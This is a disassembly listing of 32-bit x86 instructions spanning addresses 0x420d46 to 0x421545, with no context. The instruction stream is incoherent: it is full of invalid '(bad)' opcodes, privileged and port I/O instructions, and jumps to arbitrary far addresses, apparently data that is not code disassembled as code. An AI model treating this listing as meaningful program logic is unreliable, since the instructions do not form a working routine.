  420d46:	xor    eax,0x237e7a5f
  420d4b:	call   0xbd4a52ae
  420d50:	mov    ch,0xd3
  420d52:	int3   
  420d53:	mov    ch,0xdb
  420d55:	imul   edi,ecx,0x7d
  420d58:	inc    ebx
  420d59:	sti    
  420d5a:	in     eax,0x4b
  420d5c:	pop    es
  420d5d:	js     0x420d68
  420d5f:	push   cs
  420d60:	or     al,0xe2
  420d62:	leave  
  420d63:	dec    ebx
  420d64:	adc    edi,edx
  420d66:	imul   esp,eax,0xffffffc4
  420d69:	shl    DWORD PTR [esi+0x2ee28efb],1
  420d6f:	and    cl,BYTE PTR [eax]
  420d71:	xor    eax,0xceb6c4cd
  420d76:	test   eax,0xef477d1c
  420d7b:	sar    DWORD PTR [esi-0x4d],cl
  420d7e:	sar    BYTE PTR [eax],1
  420d80:	and    dh,al
  420d82:	fild   QWORD PTR [edi]
  420d84:	push   0x3c
  420d86:	push   ebp
  420d87:	adc    BYTE PTR [eax+0x42643244],dh
  420d8d:	jo     0x420d9c
  420d8f:	ins    BYTE PTR es:[edi],dx
  420d90:	sbb    DWORD PTR [edx-0x5e],esp
  420d93:	ja     0x420e01
  420d95:	fsub   QWORD PTR [ecx-0x7101a339]
  420d9b:	add    ecx,DWORD PTR ds:[esp+ecx*1]
  420d9f:	push   ecx
  420da0:	and    dl,BYTE PTR ds:0xec622b6f
  420da6:	imul   esp,edi,0x46ec6b04
  420dac:	fwait
  420dad:	cmp    al,0x24
  420daf:	fdiv   DWORD PTR [ecx-0xa154d2c]
  420db5:	cld    
  420db6:	aaa    
  420db7:	les    ebx,FWORD PTR [ebx+ebx*1-0x60]
  420dbb:	add    DWORD PTR [esi+eax*8],edx
  420dbe:	imul   eax,DWORD PTR [ecx-0x5845c828],0x403e0c35
  420dc8:	sub    BYTE PTR [edi],bh
  420dca:	add    eax,0x64560b64
  420dcf:	jg     0x420d75
  420dd1:	dec    eax
  420dd2:	hlt    
  420dd3:	adc    esi,DWORD PTR [eax+0x69]
  420dd6:	inc    eax
  420dd7:	pop    ebx
  420dd8:	nop
  420dd9:	shl    BYTE PTR [esi+edx*4+0x67],cl
  420ddd:	jb     0x420db7
  420ddf:	retf   0x8dd3
  420de2:	dec    edi
  420de3:	jb     0x420d90
  420de5:	test   eax,0xf9f2633f
  420dea:	fxch   st(6)
  420dec:	cmp    DWORD PTR [ebp-0x59],esi
  420def:	pop    edx
  420df0:	jne    0x420dc0
  420df2:	mov    eax,0xb1420354
  420df7:	loop   0x420e51
  420df9:	je     0x420da1
  420dfb:	jo     0x420e41
  420dfd:	cmc    
  420dfe:	ds xchg edx,eax
  420e00:	call   0xfa32:0x191f6e1
  420e07:	(bad)  
  420e08:	jl     0x420da5
  420e0a:	add    esi,DWORD PTR [ebx]
  420e0c:	sahf   
  420e0d:	push   es
  420e0e:	mov    dh,0x4a
  420e10:	dec    esp
  420e11:	lds    esp,FWORD PTR [eax-0x7beb27e4]
  420e17:	bnd jmp 0x420dcf
  420e1a:	sbb    eax,0x1bba5340
  420e1f:	iret   
  420e20:	push   esp
  420e21:	pop    esi
  420e22:	mov    ch,0x6a
  420e24:	xchg   BYTE PTR [ecx-0x3223d100],bh
  420e2a:	push   edx
  420e2b:	or     DWORD PTR [edi],ecx
  420e2d:	or     ah,0xc0
  420e30:	mov    ebx,0x2a5aa644
  420e35:	ins    DWORD PTR es:[edi],dx
  420e36:	mov    fs,WORD PTR [eax+ebx*8]
  420e39:	jns    0x420e96
  420e3b:	mov    bl,0x18
  420e3d:	fadd   st(7),st
  420e3f:	mov    ds:0xf008cd4,eax
  420e44:	sub    BYTE PTR [esi+eiz*2-0x7110e714],ah
  420e4b:	jmp    0x420e85
  420e4d:	sub    bh,dl
  420e4f:	call   0x7f7afd09
  420e54:	in     al,dx
  420e55:	mov    ebx,0x5a3c1397
  420e5a:	mov    ss,WORD PTR [edi+0x79]
  420e5d:	lds    edi,FWORD PTR [eax+0x1a]
  420e60:	pop    esi
  420e61:	mov    eax,0xba2d9523
  420e66:	inc    ecx
  420e67:	enter  0x4535,0xcb
  420e6b:	addr16 das 
  420e6d:	retf   0xdc2f
  420e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e71:	popa   
  420e72:	jge    0x420e7d
  420e74:	leave  
  420e75:	sti    
  420e76:	es sbb eax,0x4a353f8d
  420e7c:	inc    eax
  420e7d:	repz sub DWORD PTR [ecx-0x6372cf7b],0xfffffff4
  420e85:	mov    ds:0x4f02fffd,eax
  420e8a:	cmp    eax,0x331a7d31
  420e8f:	push   eax
  420e90:	adc    ebx,DWORD PTR [edi+0x22]
  420e93:	mov    edx,DWORD PTR ds:0xb9d650e0
  420e99:	xor    esi,ecx
  420e9b:	sahf   
  420e9c:	(bad)  
  420e9d:	xlat   BYTE PTR ds:[ebx]
  420e9e:	jmp    0x420e90
  420ea0:	outs   dx,DWORD PTR ds:[esi]
  420ea1:	jns    0x420ed6
  420ea3:	or     cl,BYTE PTR [esi-0x16]
  420ea6:	fld    st(2)
  420ea8:	mov    cl,0xbb
  420eaa:	mov    dl,dh
  420eac:	call   FWORD PTR [edi+0x4ac7714d]
  420eb2:	lahf   
  420eb3:	mov    eax,0x25b4a892
  420eb8:	mov    ah,0xaf
  420eba:	das    
  420ebb:	sub    al,BYTE PTR [edi+0x65452f01]
  420ec1:	add    eax,0x34dc8c3a
  420ec6:	jno    0x420e9b
  420ec8:	mul    al
  420eca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ecb:	mov    DWORD PTR [ecx+0x513c549a],esp
  420ed1:	ror    DWORD PTR [edi],1
  420ed3:	xchg   edi,eax
  420ed4:	jno    0x420f08
  420ed6:	ror    BYTE PTR [esi],cl
  420ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ed9:	push   0x3a
  420edb:	adc    DWORD PTR [edi+0xdc354bf],edi
  420ee1:	push   0x42
  420ee3:	adc    BYTE PTR [esi],bh
  420ee5:	dec    BYTE PTR [ecx]
  420ee7:	repz dec edx
  420ee9:	aad    0xc2
  420eeb:	shl    dl,1
  420eed:	and    esi,esp
  420eef:	mov    esp,0xacc2e00
  420ef4:	pop    edi
  420ef5:	mov    al,0x67
  420ef7:	pop    ecx
  420ef8:	dec    ecx
  420ef9:	jmp    0xa4f6:0x93d0d08c
  420f00:	lahf   
  420f01:	inc    ecx
  420f02:	call   0x43fb391c
  420f07:	arpl   WORD PTR [eax],sp
  420f09:	aam    0x25
  420f0b:	or     edi,ebx
  420f0d:	add    ch,BYTE PTR [edi]
  420f0f:	adc    al,0x97
  420f11:	cs xor ecx,0x431b3a86
  420f18:	mov    al,ds:0x63857489
  420f1d:	and    eax,0x33fc96e1
  420f22:	mov    eax,fs
  420f24:	and    ebx,esi
  420f26:	pop    ecx
  420f27:	dec    esi
  420f28:	lds    edx,FWORD PTR [ebx]
  420f2a:	ret    
  420f2b:	sahf   
  420f2c:	sbb    ch,ch
  420f2e:	mov    eax,0x82c95047
  420f33:	cmp    dh,BYTE PTR [eax+0x7f]
  420f36:	and    dl,BYTE PTR [ebp+0x567ea320]
  420f3c:	xor    DWORD PTR [edi],0xf9523d9b
  420f42:	retf   
  420f43:	mov    esi,0x8f625200
  420f48:	and    BYTE PTR [ebx-0x63],bl
  420f4b:	lods   eax,DWORD PTR ds:[esi]
  420f4c:	retf   
  420f4d:	mov    ebx,0x6ecba2da
  420f52:	jl     0x420f94
  420f54:	mov    al,ds:0xe62be36a
  420f59:	sbb    eax,0x64955f71
  420f5e:	sti    
  420f5f:	jge    0x420fb5
  420f61:	xor    al,0xda
  420f63:	dec    eax
  420f64:	push   0x2b10dcef
  420f69:	dec    ecx
  420f6a:	mov    ebp,0x105a4bf9
  420f6f:	jge    0x420fb8
  420f71:	xlat   BYTE PTR ds:[ebx]
  420f72:	std    
  420f73:	std    
  420f74:	je     0x420fa8
  420f76:	call   0x4bf4:0x9d51b446
  420f7d:	pop    edi
  420f7e:	mov    ebx,0xf91aae50
  420f83:	sub    bl,ch
  420f85:	pop    ecx
  420f86:	in     al,0x6a
  420f88:	cmp    al,0xfe
  420f8a:	shl    DWORD PTR [ecx],1
  420f8c:	jns    0x420f40
  420f8e:	test   al,0x15
  420f90:	addr16 push edx
  420f92:	sbb    edi,DWORD PTR [ecx]
  420f94:	in     al,dx
  420f95:	scas   eax,DWORD PTR es:[edi]
  420f96:	push   ebp
  420f97:	jmp    0x4a66:0xe9530695
  420f9e:	jl     0x420f33
  420fa0:	or     eax,0xd849407d
  420fa5:	mov    BYTE PTR [edx-0x44],ah
  420fa8:	mov    eax,0x73b8200e
  420fad:	outs   dx,BYTE PTR ds:[esi]
  420fae:	sbb    bh,BYTE PTR [edi+0x1f7decf1]
  420fb4:	push   ds
  420fb5:	aas    
  420fb6:	inc    ecx
  420fb7:	aas    
  420fb8:	icebp  
  420fb9:	dec    esi
  420fba:	mov    DWORD PTR [ecx],ebx
  420fbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fbd:	cwde   
  420fbe:	cmp    BYTE PTR [eax],bl
  420fc0:	push   eax
  420fc1:	dec    edi
  420fc2:	and    BYTE PTR [edx-0x48],0x1e
  420fc6:	aam    0xda
  420fc8:	xor    ebx,ebp
  420fca:	xchg   BYTE PTR [edi],dh
  420fcc:	bnd jb 0x420fe7
  420fcf:	ret    
  420fd0:	and    BYTE PTR [ecx],bl
  420fd2:	adc    eax,0x64d9ad54
  420fd7:	mov    al,0xd2
  420fd9:	in     al,dx
  420fda:	jmp    0xcd0f:0x81e4eb7d
  420fe1:	(bad)  
  420fe2:	pop    ecx
  420fe3:	xor    BYTE PTR [edi],ah
  420fe5:	cwde   
  420fe6:	mov    al,ds:0x16280da1
  420feb:	jg     0x421059
  420fed:	sub    eax,edx
  420fef:	and    eax,0xb6ef2c4d
  420ff4:	(bad)  [esi]
  420ff6:	call   0xbb67baf2
  420ffb:	jbe    0x42103d
  420ffd:	push   ebp
  420ffe:	jbe    0x420f9d
  421000:	cmp    ah,BYTE PTR [ebx]
  421002:	in     eax,dx
  421003:	ss ins DWORD PTR es:[edi],dx
  421005:	push   0x40
  421007:	ja     0x420fe2
  421009:	pop    ebp
  42100a:	call   0x7a31:0x31964480
  421011:	sbb    al,0x16
  421013:	fisubr DWORD PTR fs:[edi]
  421016:	popa   
  421017:	dec    esp
  421018:	jg     0x42108d
  42101a:	(bad)  
  42101b:	int3   
  42101c:	ss jb  0x42109a
  42101f:	daa    
  421020:	pop    ebp
  421021:	xchg   ecx,eax
  421022:	lea    esp,[eax-0x44]
  421025:	or     al,0x8f
  421027:	cmc    
  421028:	sbb    eax,0x44656b15
  42102d:	adc    bl,BYTE PTR [edx+ebp*8-0x56]
  421031:	xchg   esp,eax
  421032:	shl    DWORD PTR [edx],cl
  421034:	fwait
  421035:	xchg   ebx,eax
  421036:	pop    ebx
  421037:	ins    BYTE PTR es:[edi],dx
  421038:	push   0x458e5600
  42103d:	retf   0x5257
  421040:	push   edx
  421041:	(bad)  
  421042:	sti    
  421043:	inc    ebp
  421044:	daa    
  421045:	lea    esp,[ebx-0x25]
  421048:	(bad)  [eax+0x211f8d2b]
  42104e:	icebp  
  42104f:	jge    0x421092
  421051:	pop    esp
  421052:	add    ebx,0xc9f16d9d
  421058:	jbe    0x421062
  42105a:	inc    esp
  42105b:	inc    ecx
  42105c:	xor    eax,0x93baa197
  421061:	jmp    0x51a43ab3
  421066:	push   ebp
  421067:	pop    ecx
  421068:	cmp    BYTE PTR [edx+ecx*8-0x7d6bd5ce],ah
  42106f:	and    BYTE PTR [edx],0xf0
  421072:	sub    BYTE PTR fs:[edx+0x3f8c2bf0],ah
  421079:	mov    cl,0xe4
  42107b:	mov    dh,0x9b
  42107d:	inc    edi
  42107e:	popf   
  42107f:	retf   
  421080:	out    0x27,eax
  421082:	sbb    dl,BYTE PTR [ecx+0x25]
  421085:	aaa    
  421086:	ret    0x78d1
  421089:	inc    edx
  42108a:	xor    DWORD PTR [eax+0x7a],0x609d8208
  421091:	pop    edi
  421092:	nop
  421093:	clc    
  421094:	repnz push ecx
  421096:	mov    dh,0x39
  421098:	cwde   
  421099:	imul   esp,DWORD PTR [edi+0x44],0x4b
  42109d:	push   cs
  42109e:	lea    edi,[ecx-0x39e56932]
  4210a4:	cld    
  4210a5:	ins    BYTE PTR es:[edi],dx
  4210a6:	and    eax,0xc1e6b8b6
  4210ab:	jbe    0x42102f
  4210ad:	xor    ecx,eax
  4210af:	mov    ebx,0x7a5449a7
  4210b4:	ss mov al,0x54
  4210b7:	out    dx,eax
  4210b8:	add    al,0xef
  4210ba:	push   ds
  4210bb:	lds    ebx,FWORD PTR [ebp+0x3b2d953]
  4210c1:	in     al,0x48
  4210c3:	xor    al,0xf9
  4210c5:	sti    
  4210c6:	add    al,0xb7
  4210c8:	mov    ch,0xf0
  4210ca:	xor    BYTE PTR [esp+eiz*4-0x213a7185],bh
  4210d1:	push   ebx
  4210d2:	push   ss
  4210d3:	push   ebx
  4210d4:	jl     0x421142
  4210d6:	call   0x9344:0xd58ed785
  4210dd:	fsub   st(3),st
  4210df:	sbb    al,0xb5
  4210e1:	add    bl,BYTE PTR [eax+0x106ad3a1]
  4210e7:	cmc    
  4210e8:	fild   DWORD PTR [ebx]
  4210ea:	(bad)  
  4210eb:	call   0xae23ce8
  4210f0:	push   esi
  4210f1:	psrlw  mm4,mm7
  4210f4:	lock sub esi,ecx
  4210f7:	leave  
  4210f8:	mov    eax,0xcac4dce4
  4210fd:	push   esi
  4210fe:	fcmovnbe st,st(4)
  421100:	xor    eax,DWORD PTR [ebx]
  421102:	pop    es
  421103:	xchg   ebp,eax
  421104:	xor    DWORD PTR [ecx+0x4e],edx
  421107:	out    dx,al
  421108:	sbb    edx,DWORD PTR [edi+ecx*1+0x77c5063a]
  42110f:	or     al,0xd6
  421111:	or     bl,BYTE PTR [esi]
  421113:	mov    ah,0x81
  421115:	push   0xffffffeb
  421117:	mov    ebp,ebx
  421119:	hlt    
  42111a:	fs aam 0xcf
  42111d:	(bad)  
  42111f:	cmp    ah,ch
  421121:	add    eax,0x5fd983a8
  421126:	stc    
  421127:	jmp    0x822f:0x237283d
  42112e:	into   
  42112f:	ins    BYTE PTR es:[edi],dx
  421130:	adc    DWORD PTR [ebp-0x42],ecx
  421133:	pop    ebx
  421134:	mov    esp,0x1d097924
  421139:	xor    edi,DWORD PTR [ebx-0x25]
  42113c:	je     0x42113e
  42113e:	xchg   edi,eax
  42113f:	pop    esi
  421140:	fidivr WORD PTR ds:0xa82ca78b
  421146:	out    0xb2,eax
  421148:	iret   
  421149:	and    esp,0x5a
  42114c:	xchg   edi,eax
  42114d:	push   ebx
  42114e:	stc    
  42114f:	hlt    
  421150:	jo     0x4211c2
  421152:	leave  
  421153:	push   eax
  421154:	stc    
  421155:	jo     0x421173
  421157:	cmp    al,0x14
  421159:	xlat   BYTE PTR ds:[ebx]
  42115a:	push   ebx
  42115b:	dec    edi
  42115c:	sbb    eax,0xac2fb5ec
  421161:	adc    dh,0x95
  421164:	jne    0x4210f7
  421166:	lods   eax,DWORD PTR ds:[esi]
  421167:	jge    0x421188
  421169:	add    BYTE PTR [edx+0x6b048e0b],bl
  42116f:	aas    
  421170:	cwde   
  421171:	fst    QWORD PTR [ebp+0x78]
  421174:	and    cl,BYTE PTR [edx]
  421176:	inc    ebx
  421177:	mov    ds:0xb9acaf98,eax
  42117c:	inc    ebx
  42117d:	xchg   BYTE PTR [esi+0x2d3a49e9],al
  421183:	push   esi
  421184:	sti    
  421185:	jo     0x421169
  421187:	in     eax,dx
  421188:	or     DWORD PTR [esp+eiz*8+0x55ca5421],esp
  42118f:	xchg   ebp,eax
  421190:	mov    ch,0xdd
  421192:	jne    0x421176
  421194:	mov    ds:0x65979bc3,al
  421199:	hlt    
  42119a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42119b:	aad    0x6b
  42119d:	dec    esi
  42119e:	sbb    cl,ah
  4211a0:	push   0x9a527de9
  4211a5:	mov    BYTE PTR [eax-0x390300b3],bh
  4211ab:	cmp    eax,ebx
  4211ad:	sbb    dh,BYTE PTR [edx]
  4211af:	rdtsc  
  4211b1:	aas    
  4211b2:	cli    
  4211b3:	mov    ecx,0x66a1a6a9
  4211b8:	dec    esp
  4211b9:	fsub   QWORD PTR [ebp-0xbac39c0]
  4211bf:	dec    edi
  4211c0:	ja     0x4211e0
  4211c2:	adc    al,ah
  4211c4:	mov    al,0xf4
  4211c6:	dec    edx
  4211c7:	inc    edx
  4211c8:	push   edi
  4211c9:	push   ebp
  4211ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211cb:	pop    edx
  4211cc:	arpl   WORD PTR [edx+0x465c743f],ax
  4211d2:	sbb    edx,DWORD PTR [ebp+0xf]
  4211d5:	js     0x421222
  4211d7:	int3   
  4211d8:	les    eax,FWORD PTR [edi-0x1ca6c398]
  4211de:	into   
  4211df:	mov    edx,0x4ede8d0e
  4211e4:	push   ebx
  4211e5:	das    
  4211e6:	mov    edi,0xcee37a25
  4211eb:	mov    ecx,0xf161ad8e
  4211f0:	mov    eax,0x785ef8bd
  4211f5:	push   esp
  4211f6:	les    edx,FWORD PTR [eax+eiz*1]
  4211f9:	mov    dh,0x4f
  4211fb:	sub    DWORD PTR [edx],eax
  4211fd:	mov    esp,0x42e433b7
  421202:	sbb    dh,0x7
  421205:	pop    es
  421206:	mov    WORD PTR [edx-0x28a7b924],?
  42120c:	(bad)  
  42120d:	lods   eax,DWORD PTR ds:[esi]
  42120e:	jle    0x4211f0
  421210:	mov    eax,ds:0xb3d7e43c
  421215:	fcomp  st(3)
  421217:	cmp    eax,DWORD PTR ds:0x71d3cd3f
  42121d:	(bad)  [ebx]
  42121f:	pop    edx
  421220:	arpl   WORD PTR [esi+ecx*1],bp
  421223:	xor    bh,ch
  421225:	data16 fidivr DWORD PTR [esp+ebp*2+0x3422f06f]
  42122d:	push   cs
  42122e:	mov    al,ds:0xe7274225
  421233:	ins    DWORD PTR es:[edi],dx
  421234:	jae    0x4211e1
  421236:	jg     0x421270
  421238:	stos   BYTE PTR es:[edi],al
  421239:	arpl   WORD PTR [ebx],sp
  42123b:	mov    eax,eax
  42123d:	xchg   ebp,eax
  42123e:	sbb    al,0x1d
  421240:	cmc    
  421241:	mov    bh,0x95
  421243:	out    0x6f,eax
  421245:	mov    eax,0x1aeb8a67
  42124a:	adc    DWORD PTR [eax+0x6c48e092],0xce1e8b25
  421254:	sti    
  421255:	loop   0x42120a
  421257:	or     dh,BYTE PTR [ebp-0x76]
  42125a:	in     eax,0x4b
  42125c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42125d:	cmp    al,0x5b
  42125f:	std    
  421260:	in     al,0x68
  421262:	sub    eax,0x34e59cf6
  421267:	jae    0x421283
  421269:	push   0xe1ed7cf
  42126e:	arpl   WORD PTR [esi+0x72],dx
  421271:	jge    0x4212be
  421273:	xchg   esp,eax
  421274:	ins    BYTE PTR es:[edi],dx
  421275:	mov    eax,ds:0x3eb2fa72
  42127a:	inc    edi
  42127b:	push   esp
  42127c:	mov    esp,0x8c056d26
  421281:	or     bh,BYTE PTR [edi+eax*2]
  421284:	dec    edi
  421285:	call   FWORD PTR [edi-0x58]
  421288:	mov    ecx,0xa5d3f644
  42128d:	push   edi
  42128e:	pushf  
  42128f:	les    ebx,FWORD PTR [ecx-0x524007ff]
  421295:	int3   
  421296:	fxch   st(3)
  421298:	loope  0x42125e
  42129a:	out    dx,eax
  42129b:	xor    BYTE PTR [ebx+0xa8eef63],ch
  4212a1:	call   0x30dc:0xed8a6a35
  4212a8:	and    BYTE PTR [ecx],bh
  4212aa:	cld    
  4212ab:	xchg   BYTE PTR [ecx+0x5b],dh
  4212ae:	jae    0x4212d0
  4212b0:	stos   DWORD PTR es:[edi],eax
  4212b1:	rcl    BYTE PTR [esi-0x1c],0x55
  4212b5:	nop
  4212b6:	add    BYTE PTR [esi+0x6cf32917],bl
  4212bc:	cmp    eax,0x9fafe264
  4212c1:	add    eax,0xb23443c7
  4212c6:	dec    ebp
  4212c7:	pop    edi
  4212c8:	jg     0x4212b2
  4212ca:	outs   dx,DWORD PTR ds:[esi]
  4212cb:	mov    ch,0xee
  4212cd:	fild   QWORD PTR [edi]
  4212cf:	gs stos BYTE PTR es:[edi],al
  4212d1:	icebp  
  4212d2:	mov    edx,0xecc48490
  4212d7:	test   eax,0x632e8d18
  4212dc:	mov    ds:0xabc1cf6,al
  4212e1:	repnz les esp,FWORD PTR [edi-0x5534d7d7]
  4212e8:	test   DWORD PTR [edx+0x64],ebp
  4212eb:	jecxz  0x4212e4
  4212ed:	(bad)  
  4212ee:	cli    
  4212ef:	icebp  
  4212f0:	icebp  
  4212f1:	adc    BYTE PTR [esi-0x39],dl
  4212f4:	adc    eax,esp
  4212f6:	push   eax
  4212f7:	adc    esi,DWORD PTR [ebx+0xf6f6e8a]
  4212fd:	sbb    bl,BYTE PTR [edi]
  4212ff:	imul   edi,DWORD PTR [edx-0x62df45ab],0x98c9d8f2
  421309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42130a:	scas   eax,DWORD PTR es:[edi]
  42130b:	stos   BYTE PTR es:[edi],al
  42130c:	cld    
  42130d:	test   BYTE PTR [edx],ch
  42130f:	mov    ah,0xc9
  421311:	lds    edi,FWORD PTR [ebp+eiz*4+0x7f54a061]
  421318:	dec    ebx
  421319:	push   ebp
  42131a:	pop    ebx
  42131b:	lea    ecx,[ecx]
  42131d:	pop    esp
  42131e:	jo     0x421333
  421320:	aaa    
  421321:	add    edi,DWORD PTR [ecx+edi*8]
  421324:	call   0xecd8a4d6
  421329:	mov    al,ds:0xbb042c
  42132e:	ins    DWORD PTR es:[edi],dx
  42132f:	and    dh,BYTE PTR [ebx+ebp*1-0x33]
  421333:	(bad)  
  421334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421335:	push   ebp
  421336:	ret    0x223b
  421339:	aad    0x79
  42133b:	cld    
  42133c:	cli    
  42133d:	mov    dh,0x30
  42133f:	add    DWORD PTR ds:0xa4c4fe7,edi
  421345:	pop    edi
  421346:	(bad)
  42134a:	lods   al,BYTE PTR ds:[esi]
  42134b:	test   edi,ebx
  42134d:	jb     0x42136b
  42134f:	in     eax,0x2c
  421351:	clc    
  421352:	jmp    DWORD PTR [ecx]
  421354:	and    BYTE PTR [edi],cl
  421356:	int    0xa4
  421358:	xor    esp,DWORD PTR [ecx-0x5a]
  42135b:	ins    BYTE PTR es:[edi],dx
  42135c:	sub    al,0xf2
  42135e:	shl    esp,cl
  421360:	or     dl,0xbc
  421363:	outs   dx,BYTE PTR ds:[esi]
  421364:	outs   dx,DWORD PTR ds:[esi]
  421365:	cld    
  421366:	dec    ebp
  421367:	push   cs
  421368:	ds pop esp
  42136a:	sub    bh,BYTE PTR [eax]
  42136c:	adc    al,0x14
  42136e:	xchg   esi,eax
  42136f:	pop    esp
  421370:	lock jmp 0xc0db00f3
  421376:	pushf  
  421377:	mov    WORD PTR [ebp-0x70],cs
  42137a:	hlt    
  42137b:	mov    bl,0xbe
  42137d:	dec    eax
  42137e:	xchg   edx,eax
  42137f:	and    dl,BYTE PTR [ebx+0x1c]
  421382:	nop
  421383:	mov    dh,0xd1
  421385:	mov    cl,0x10
  421387:	es mov esp,0xcbc0408b
  42138d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42138e:	jbe    0x421323
  421390:	repz inc edx
  421392:	cmp    dh,BYTE PTR [edi]
  421394:	jb     0x42139f
  421396:	cli    
  421397:	fild   WORD PTR [edi]
  421399:	push   0xffffff87
  42139b:	(bad)  
  42139c:	(bad)  
  42139e:	loope  0x4213ea
  4213a0:	jecxz  0x42136c
  4213a2:	dec    edi
  4213a3:	sbb    eax,0xad89f555
  4213a8:	(bad)  
  4213a9:	adc    DWORD PTR [ecx+0x6c],ebp
  4213ac:	sbb    dh,ch
  4213ae:	dec    eax
  4213af:	mov    al,ds:0x992a6823
  4213b4:	mov    dl,0x4e
  4213b6:	and    ch,bh
  4213b8:	cmp    ebp,DWORD PTR [ebp+0x2b]
  4213bb:	fsubr  st(4),st
  4213bd:	cmp    eax,0x4572fb4c
  4213c2:	lods   eax,DWORD PTR es:[esi]
  4213c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213c5:	cs add eax,0x6c29260f
  4213cb:	aam    0x1a
  4213cd:	add    bh,BYTE PTR [edi-0x1c]
  4213d0:	ret    0x84e
  4213d3:	jo     0x421438
  4213d5:	mov    esi,0x7ff8f983
  4213da:	and    DWORD PTR [esi-0x33a96d6e],esi
  4213e0:	pop    ecx
  4213e1:	and    dl,BYTE PTR [esi]
  4213e3:	out    0x6b,eax
  4213e5:	or     ch,BYTE PTR [ebx+edi*4]
  4213e8:	push   ds
  4213e9:	jmp    0x421452
  4213eb:	push   ecx
  4213ec:	out    dx,eax
  4213ed:	ret    
  4213ee:	test   edi,edi
  4213f0:	mov    ebp,ecx
  4213f2:	fist   WORD PTR ds:0xd9e872f6
  4213f8:	cmp    bh,BYTE PTR [eax-0x1e74ae26]
  4213fe:	cmp    dl,BYTE PTR [ecx-0x3a51ad69]
  421404:	hlt    
  421405:	jecxz  0x4213cc
  421407:	cmp    DWORD PTR [edx-0x421cefce],edx
  42140d:	repnz out 0xc7,eax
  421410:	push   cs
  421411:	jg     0x421434
  421413:	pop    esp
  421414:	add    eax,0x57298ff8
  421419:	add    BYTE PTR [eax+0x6006bc9c],cl
  42141f:	cmp    al,0xf3
  421421:	mov    ecx,0x609c85cb
  421426:	mov    ds:0x28752e98,eax
  42142b:	sbb    edx,DWORD PTR [ecx]
  42142d:	pop    ds
  42142e:	jb     0x421441
  421430:	mov    ah,dl
  421432:	push   edi
  421433:	push   0x19
  421435:	pop    edi
  421436:	aaa    
  421437:	adc    bh,BYTE PTR gs:[eax]
  42143a:	fwait
  42143b:	js     0x421425
  42143d:	sbb    eax,0x6dbfd829
  421442:	ins    BYTE PTR es:[edi],dx
  421443:	mov    ds:0x5b42380b,eax
  421448:	sti    
  421449:	(bad)  
  42144a:	xchg   edx,eax
  42144b:	xor    BYTE PTR [ebx+0x47],dl
  42144e:	push   ecx
  42144f:	adc    eax,0xf9c3ee3f
  421454:	mov    ds:0x4a8c1ca9,al
  421459:	je     0x4213e1
  42145b:	dec    edx
  42145c:	inc    esp
  42145d:	add    ah,dl
  42145f:	ins    BYTE PTR es:[edi],dx
  421460:	push   esi
  421461:	add    edx,DWORD PTR [ecx-0x7]
  421464:	test   dh,ah
  421466:	sbb    DWORD PTR [esi-0x64],edx
  421469:	jb     0x4214a2
  42146b:	push   ss
  42146c:	not    DWORD PTR cs:[ecx]
  42146f:	aam    0xdd
  421471:	pop    edi
  421472:	cmp    al,0xc7
  421474:	je     0x421485
  421476:	rcr    BYTE PTR [ebx],0xbe
  421479:	jl     0x4214e2
  42147b:	xchg   esp,eax
  42147c:	and    al,0x46
  42147e:	xor    ah,BYTE PTR [ebx]
  421480:	ss mov ch,0x39
  421483:	jne    0x421405
  421485:	jp     0x4214a5
  421487:	push   es
  421488:	out    0x36,eax
  42148a:	dec    eax
  42148b:	fs or  al,0x45
  42148e:	stc    
  42148f:	sbb    BYTE PTR [edx],0x20
  421492:	push   0x5d201b05
  421497:	sbb    BYTE PTR [edi],ch
  421499:	mov    al,ds:0x7c4ff78e
  42149e:	xor    DWORD PTR [ecx],esp
  4214a0:	fadd   st(0),st
  4214a2:	enter  0x104e,0xa
  4214a6:	(bad)  
  4214a7:	mov    edi,0x26194867
  4214ac:	mov    ds:0x8d72701b,eax
  4214b1:	dec    ebp
  4214b2:	in     eax,0xe3
  4214b4:	(bad)  
  4214b5:	jg     0x421461
  4214b7:	sub    ecx,DWORD PTR [esi-0xd23d8ea]
  4214bd:	jmp    0xa5b7d48c
  4214c2:	adc    dh,0x2b
  4214c5:	xor    bh,BYTE PTR [eax]
  4214c7:	adc    cl,BYTE PTR [eax-0x1362cce7]
  4214cd:	pop    esp
  4214ce:	call   FWORD PTR [eax+edx*2-0x1e]
  4214d2:	hlt    
  4214d3:	cmp    eax,0x129d9e21
  4214d8:	shl    BYTE PTR [eax+0x7fa870f7],1
  4214de:	iret   
  4214df:	imul   esp,ebx,0xf
  4214e2:	(bad)  
  4214e3:	idiv   DWORD PTR [ecx+0x409e2fb7]
  4214e9:	inc    ecx
  4214ea:	or     esi,DWORD PTR [edi+0x6]
  4214ed:	push   eax
  4214ee:	aam    0xf5
  4214f0:	call   0xd4fe:0x6bf7d6d
  4214f7:	and    al,0x7f
  4214f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214fa:	mov    al,ds:0x9ff8223d
  4214ff:	jb     0x42155a
  421501:	inc    ebp
  421502:	mov    eax,0x91758d63
  421507:	out    dx,eax
  421508:	(bad)  
  421509:	(bad)  
  42150a:	and    DWORD PTR ds:0x625dff09,0xc1f60ba4
  421514:	imul   edi,DWORD PTR [ebp+0x51cd288],0xfffffff4
  42151b:	cli    
  42151c:	dec    esp
  42151d:	les    esp,FWORD PTR [edi+0x67f74321]
  421523:	pop    eax
  421524:	shl    DWORD PTR [edx-0x576f5f3a],1
  42152a:	fimul  WORD PTR [eax-0x27]
  42152d:	sahf   
  42152e:	cdq    
  42152f:	jno    0x421597
  421531:	jg     0x42154e
  421533:	add    BYTE PTR [ebx+ecx*4+0x7478e819],ch
  42153a:	xor    DWORD PTR [esi+0x5],eax
  42153d:	icebp  
  42153e:	xchg   edx,eax
  42153f:	cmp    esp,DWORD PTR [edx]
  421541:	fistp  DWORD PTR [ebx]
  421543:	mov    dl,0xa8
  421545:	jp     0x42151e
